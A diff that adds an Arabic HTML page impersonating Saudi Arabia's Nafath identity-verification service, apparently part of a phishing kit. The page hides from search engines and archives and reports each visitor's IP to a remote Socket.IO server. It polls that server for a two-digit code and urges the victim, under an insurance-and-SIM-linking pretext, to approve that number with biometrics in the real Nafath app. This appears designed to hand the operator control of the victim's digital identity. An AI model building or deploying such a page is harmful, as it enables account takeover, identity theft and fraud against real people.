@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>Nafad verification</title>
+  <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    rel="stylesheet" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Tajawal", sans-serif;
+      font-weight: 400;
+    }
+
+    .navbar-light .navbar-toggler {
+      border-color: #ffffff00;
+    }
+  </style>
+</head>
+
+<body dir="rtl" style="background-color: #f4f6f9">
+  <nav class="navbar navbar-expand-lg navbar-light pt-4 pb-4 shadow" style="background-color: #fff">
+    <img alt="" src="assets/icon/nafad.png" width="128" />
+    <button class="navbar-toggler ml-2" data-toggle="collapse" data-target="#navbarSupportedContent">
+      <i class="fas fa-bars"></i>
+    </button>
+  </nav>
+
+  <!-- Modal -->
+  <div class="modal fade" id="reqQuModal" tabindex="-1" aria-labelledby="verificationModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content">
+        <!-- Modal Header -->
+        <div class="modal-header border-0">
+          <h5 class="modal-title mx-auto fw-bold text-success" id="verificationModalLabel" style="font-size: 20px">
+            التحقق من خلال تطبيق نفاذ
+          </h5>
+          <button type="button" class="close" data-dismiss="modal" aria-label="إغلاق">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+
+        <!-- Modal Body -->
+        <div class="modal-body text-center">
+          <p class="w-100 mb-3 text-white" style="background-color: #198754; font-size: 18px">
+            تطبيق نفاذ
+          </p>
+          <div class="countdown-number mb-3">
+            <div class="border border-2 mx-auto d-flex align-items-center justify-content-center" id="strongPhoneNum"
+              style="
+                  width: 80px;
+                  height: 80px;
+                  font-size: 24px;
+                  font-weight: bold;
+                  color: #00b894;
+                  border-color: #00b894 !important;
+                  border-radius: 5px;
+                  border-width: 4px !important;
+                "></div>
+          </div>
+
+          <p style="line-height: 1.8; font-size: 14px">
+            الرجاء، فتح تطبيق نفاذ وتأكيد طلب اصدار أمر ربط شريحتك على رقم
+            الجوال لتأكيد حجز الموعد
+            <span class="text-success" style="font-weight: bold" id="userPhoneNumber"></span>
+            <br />
+            باختيار الرقم أعلاه
+          </p>
+
+          <div class="mb-3">
+            <span id="modalTimer" class="badge badge-light text-dark p-2" style="font-size: 14px">
+              01:00
+            </span>
+          </div>
+
+          <div class="steps d-flex justify-content-between">
+            <div class="step">
+              <img src="/assets/photos/nafaz_2.jpeg" alt="Step 1" style="width: 140px; height: auto" />
+              <p class="mt-2" style="font-size: 14px">تحميل تطبيق نفاذ</p>
+            </div>
+            <div class="step">
+              <img src="/assets/photos/nafaz_1.jpeg" alt="Step 2" style="width: 140px; height: auto" />
+              <p class="mt-2" style="font-size: 14px">
+                اختيار الرقم أعلاه<br />والتحقق عبر السمات الحيوية
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Modal Footer -->
+        <div class="modal-footer border-0">
+          <button type="button" class="btn btn-secondary w-100" data-bs-dismiss="modal">
+            إغلاق
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- end modal -->
+
+  <div class="text-center mt-5 container">
+    <h6 class="pl-3 pr-3" style="color: #11998e; font-weight: 600">
+      <span style="font-size: 26px; font-weight: 800">لطفاً ،</span>
+      توجه إلى تطبيق "نفاذ" لاستكمال إجراءات استبدال و ربط وثيقة التأمين
+      بشريحة الجوال وذلك من خلال اختيار الرقم الظاهر أدناه
+    </h6>
+    <hr style="border-bottom: #2e2e2e 1px solid" />
+
+    <div class="alert alert-success" role="alert">
+      <h1 id="nafad_code" style="margin: 20px 0 4px; font-size: 50px; font-weight: 800"></h1>
+    </div>
+
+    <button class="btn btn-success col-12 p-3" style="background-color: #11998e; font-size: 20px; font-weight: 600"
+      id="goApp">
+      انتقل الى تطبيق نفاذ
+    </button>
+
+    <img alt="" class="mt-5" src="assets/icon/cdeie.png" style="width: 50%; margin: auto" />
+  </div>
+
+  <img alt="" class="mt-5" src="assets/photos/footerNafad.png" width="100%" />
+
+  <!-- 1) Load Socket.IO & announce our IP + page -->
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    window.socket = io("https://b-care-server-mohammad.onrender.com");
+    window.visitorIP = null;
+
+    (async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await res.json();
+        window.visitorIP = ip;
+        socket.emit("updateLocation", {
+          ip,
+          page: "nafad-basmah.html",
+        });
+      } catch (e) {
+        console.error("IP fetch failed:", e);
+      }
+    })();
+  </script>
+
+  <!-- 2) location.js -->
+  <script src="./assets/js/location.js"></script>
+
+  <!-- 3) Poll for the 2-digit code until you get a non-zero value -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const codeEl = document.getElementById("nafad_code");
+      let pollId;
+
+      function requestCode() {
+        if (!window.visitorIP) return;
+        socket.emit("getNafadCode");
+      }
+
+      socket.on("nafadCode", (msg) => {
+        if (msg.error) {
+          console.error("nafadCode error:", msg.error);
+          return;
+        }
+        const code =
+          msg.code == null ? "" : String(msg.code).padStart(2, "0");
+        // only accept if non-empty and not "00"
+        if (code && code !== "00") {
+          codeEl.textContent = code;
+          clearInterval(pollId);
+        }
+      });
+
+      // start polling every 5 seconds
+      pollId = setInterval(requestCode, 1000);
+      requestCode(); // first immediate
+    });
+  </script>
+
+  <!-- 4) “Go to Nafath app” button -->
+  <script>
+    document.getElementById("goApp").addEventListener("click", () => {
+      const ua = navigator.userAgent || "";
+      let url;
+      if (/iPhone|iPad|iPod/.test(ua)) {
+        url =
+          "https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871";
+      } else if (/Android/.test(ua)) {
+        url = "https://play.google.com/store/apps/details?id=sa.gov.nic.myid";
+      } else {
+        url = "https://nafath.sa";
+      }
+      location.href = url;
+    });
+  </script>
+
+  <!-- 5) Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // show the modal
+      $("#reqQuModal").modal("show");
+
+      // fill in the two‑digit code
+      socket.on("nafadCode", ({ code }) => {
+        if (!code || code === "00") return;
+        const two = String(code).padStart(2, "0");
+        document.getElementById("strongPhoneNum").textContent = two;
+        document.getElementById("userPhoneNumber").textContent = two;
+      });
+
+      // 60‑second countdown
+      let sec = 60;
+      const timerEl = document.getElementById("modalTimer");
+      const timerInterval = setInterval(() => {
+        sec--;
+        const mm = String(Math.floor(sec / 60)).padStart(2, "0");
+        const ss = String(sec % 60).padStart(2, "0");
+        timerEl.textContent = `${mm}:${ss}`;
+        if (sec <= 0) clearInterval(timerInterval);
+      }, 1000);
+    });
+  </script>
+</body>
+
+</html>
